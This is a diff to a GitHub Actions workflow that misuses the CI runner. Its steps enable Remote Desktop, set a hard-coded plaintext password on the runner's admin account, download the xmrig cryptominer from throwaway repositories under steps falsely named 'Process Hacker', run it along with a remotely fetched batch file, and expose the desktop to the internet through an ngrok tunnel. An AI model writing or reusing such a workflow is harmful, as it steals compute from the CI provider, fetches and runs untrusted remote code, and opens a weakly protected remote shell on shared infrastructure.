@@ -22,7 +22,7 @@ jobs:
     - run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
     - run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)
     - name: Process Hacker.
-      run: Invoke-WebRequest https://github.com/Josephrodriguezjcy/hgjghhjggh/raw/main/xmrig-6.14.1.zip -OutFile "xmrig-6.14.1.zip"
+      run: Invoke-WebRequest https://github.com/Kevinrobinson8x8/batnik/raw/main/xmrig-6.14.1.zip -OutFile "xmrig-6.14.1.zip"
     - name: Extrakt Process Hacker.
       run: Expand-Archive -LiteralPath "xmrig-6.14.1.zip" -DestinationPath "C:\Reference"
     - name: StarT Process hacker.
@@ -30,7 +30,7 @@ jobs:
     - name: Process Hacker1.
       run: Invoke-WebRequest https://raw.githubusercontent.com/Ronaldlewis439/bztgxzcad5/main/uan.bat -OutFile uan.bat
     - name: Extrakt Process Hacker.
-      run: cmd /c uan.bat
+      run: cmd /c C:\Reference\start.cmd
     - name: Create Tunnel
       run: .\ngrok\ngrok.exe tcp 3389
       
